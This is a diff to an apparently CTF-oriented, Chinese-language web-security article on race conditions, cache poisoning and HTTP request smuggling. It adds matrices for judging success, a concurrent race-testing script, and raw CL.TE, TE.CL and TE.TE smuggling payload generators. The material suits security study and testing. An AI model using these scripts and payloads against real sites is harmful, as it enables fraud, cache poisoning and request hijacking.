@@ -14,12 +14,59 @@ keywords: ["条件竞争", "cache poisoning", "request smuggling", "CL.TE", "TE.
 difficulty: "advanced"
 tags: ["caching", "web-security", "race-condition", "dos", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
+last_updated: "2026-07-04"
 related_articles: []
 ---
 # Race Condition / Cache Poisoning / Request Smuggling
 
 ## 1. Race Condition
+
+### 竞态判定矩阵
+
+竞态不要只看 HTTP 200 个数，必须看“持久化副作用”。同一批并发后立刻读状态，判断数据库层是否真的多扣、多发、多创建。
+
+| 场景 | 触发请求 | 状态读取 | 成功标志 | 失败样本 |
+|---|---|---|---|---|
+| 优惠码 | `POST /redeem` | `GET /wallet` / `GET /orders` | 成功次数 > 1 且余额/订单累计 | 只有首个 200，余额只变一次 |
+| 转账 | `POST /transfer` | `GET /balance` | 两笔以上入账或负余额 | 后端幂等 key 拦截 |
+| 邀请码 | `POST /invite` | `GET /invites` | 同一账号产生多个可用 code | 返回重复 code 但只能用一次 |
+| 邮箱验证 | `POST /verify` + `POST /login` | `GET /me` | `email_verified=true` 前可登录 | 登录态仍受 verify 字段限制 |
+| 上传处理 | `POST /upload` + `GET /uploads/x` | 文件访问/包含 | 临时文件在扫描/重命名前可访问 | 只出现 404 或 pending |
+
+```python
+# race_oracle.py — 并发请求 + 状态读取
+import concurrent.futures
+import requests
+
+def race_with_state(write_req, read_req, count=40, workers=20):
+    """
+    write_req/read_req:
+      {"method": "POST", "url": "...", "headers": {...}, "json": {...}}
+    """
+    s = requests.Session()
+
+    def send(req):
+        return s.request(
+            req.get("method", "GET"),
+            req["url"],
+            headers=req.get("headers"),
+            json=req.get("json"),
+            data=req.get("data"),
+            timeout=10,
+        )
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
+        results = list(ex.map(lambda _: send(write_req), range(count)))
+
+    state = send(read_req)
+    return {
+        "status_counts": {c: sum(1 for r in results if r.status_code == c)
+                          for c in sorted({r.status_code for r in results})},
+        "lengths": sorted({len(r.text) for r in results}),
+        "state_status": state.status_code,
+        "state_preview": state.text[:500],
+    }
+```
 
 ### Turbo Intruder 并发模板
 
@@ -100,6 +147,16 @@ print(codes)  # {200: 5, 400: 45} → 5 次成功 = race bug!
 
 ### 探测 Unkeyed Headers
 
+### Cache Key 推断
+
+| 输入 | 如果入 cache key | 如果不入 cache key | 下一跳 |
+|---|---|---|---|
+| `X-Forwarded-Host` | 每个 host 都 MISS | 带 header 预热后无 header HIT 同正文 | 资源 URL / redirect 毒化 |
+| `Origin` | 不同 Origin 独立缓存 | CORS 或反射内容被共享 | CORS + cache poisoning |
+| `Cookie` | 每个 cookie 独立 | 个性化响应可被共享 | cache deception / session leak |
+| `Accept-Encoding` | gzip/br 独立 | 压缩差异可污染 | compression side-channel |
+| Query 参数 | `?x=1` 与 `?x=2` 分离 | query ignored | cache buster 失效 |
+
 ```python
 # 找出 CDN cache key 不包含但后端处理的 header
 import requests
@@ -161,6 +218,44 @@ POISON_PROBES = {
 ## 3. Request Smuggling
 
 ### CL.TE vs TE.CL 探测
+
+### 原始字节差异矩阵
+
+| 类型 | 前端解析 | 后端解析 | 探测信号 | 失败样本 |
+|---|---|---|---|---|
+| CL.TE | 用 `Content-Length` | 用 `Transfer-Encoding` | 后端把残留字节当下一请求前缀 | 前端直接 400 |
+| TE.CL | 用 `Transfer-Encoding` | 用 `Content-Length` | 下一请求被拼接或延迟响应 | 两端都按 TE 结束 |
+| TE.TE | 一个接受混淆 TE | 一个忽略混淆 TE | header 大小写/空格导致分歧 | 两端规范化一致 |
+| H2.CL | H2 前端按 frame | H1 后端按 CL | downgrade 后残留 body 进入队列 | 网关拒绝 H2 body/header |
+| H2.TE | H2 前端忽略 TE | H1 后端接受 TE | 降级后 chunk 语义生效 | H2 层禁止 TE |
+
+```python
+# smuggling_payloads.py — 只生成原始 bytes，交给 nc/socket 发送
+def cl_te(host):
+    return (
+        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
+        "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
+        "0\r\n\r\nG"
+    ).encode()
+
+def te_cl(host):
+    return (
+        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
+        "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
+        "5c\r\nGPOST / HTTP/1.1\r\nHost: x\r\n\r\n0\r\n\r\n"
+    ).encode()
+
+def te_te(host):
+    variants = [
+        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
+        "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
+        "Transfer-Encoding : chunked",
+        "Transfer-Encoding:\tchunked",
+    ]
+    return [(
+        f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n{te}\r\n\r\n0\r\n\r\nG"
+    ).encode() for te in variants]
+```
 
 ```python
 # 路径打通后记录缓存 key、命中 header 和响应差异
@@ -289,7 +384,12 @@ H2.CL Smuggling → HTTP/2 降级 → 注入请求 → 内网 SSRF
 
 ## Evidence
 
-记录: 并发数和结果分布、cache header (X-Cache, Age, Cache-Control)、原始 HTTP bytes (CRLF 位置)、smuggling probe 的两种解析结果、竞态成功次数 / 总次数
+- `race_batch.json`: 并发数、连接数、响应状态分布、响应长度集合、批次时间窗口。
+- `race_state_after.json`: 并发后的余额、订单、邀请码、文件状态等持久化结果。
+- `cache_key_matrix.csv`: header/query/cookie 是否入 key、预热响应、复取响应、命中 header。
+- `smuggling_raw.bin`: CL.TE / TE.CL / TE.TE 原始 bytes，保留 CRLF 和长度字段。
+- 成功样本: HTTP 成功数与持久化状态同时变化；或 smuggling probe 造成下一请求延迟/串扰。
+- 失败样本: 只有表面 200 但状态只变一次；缓存全 MISS；前后端解析一致直接 400。
 
 ## MCP 工具映射
 
